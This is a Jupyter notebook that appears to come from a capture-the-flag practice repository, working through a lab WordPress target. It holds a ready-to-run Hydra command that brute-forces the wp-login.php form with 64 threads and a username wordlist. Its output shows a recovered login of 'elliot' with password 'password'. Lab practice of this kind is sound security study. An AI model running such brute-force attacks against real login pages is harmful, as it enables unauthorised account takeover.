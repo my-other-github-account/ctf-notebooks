{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "dd9b9ff9-c6a4-46d5-8855-97ceac7985a4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: DIR=/wp-login.php\n",
      "env: BODY=log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.167.66%2Fwp-admin%2F&testcookie=1\n",
      "env: COOKIE=H=Cookie: wordpress_test_cookie=WP+Cookie+check\n",
      "env: COND=Invalid username.\n",
      "env: URL=10.10.246.16\n"
     ]
    }
   ],
   "source": [
    "%env DIR=/wp-login.php\n",
    "%env BODY=log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.167.66%2Fwp-admin%2F&testcookie=1\n",
    "%env COOKIE=H=Cookie: wordpress_test_cookie=WP+Cookie+check\n",
    "%env COND=Invalid username.\n",
    "%env URL=10.10.246.16"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9accea3f-fca7-4393-b0b9-96cfd9a668f2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-07 01:16:20\n",
      "[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\n",
      "[DATA] max 64 tasks per 1 server, overall 64 tasks, 858235 login tries (l:858235/p:1), ~13410 tries per task\n",
      "[DATA] attacking http-post-form://10.10.246.16:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.167.66%2Fwp-admin%2F&testcookie=1:Invalid username.\n",
      "[\u001b[1;32m80\u001b[0m][\u001b[1;32mhttp-post-form\u001b[0m] host: \u001b[1;32m10.10.246.16\u001b[0m   login: \u001b[1;32mElliot\u001b[0m   password: \u001b[1;32mpassword\u001b[0m\n",
      "[STATUS] 1216.00 tries/min, 1216 tries in 00:01h, 857019 to do in 11:45h, 64 active\n",
      "[STATUS] 514.33 tries/min, 1543 tries in 00:03h, 856692 to do in 27:46h, 64 active\n",
      "[\u001b[1;32m80\u001b[0m][\u001b[1;32mhttp-post-form\u001b[0m] host: \u001b[1;32m10.10.246.16\u001b[0m   login: \u001b[1;32melliot\u001b[0m   password: \u001b[1;32mpassword\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!hydra -t 64 -I -L fsociety.txt -p password $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fd6494a3-f486-409f-9d81-d8a0f42265a9",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
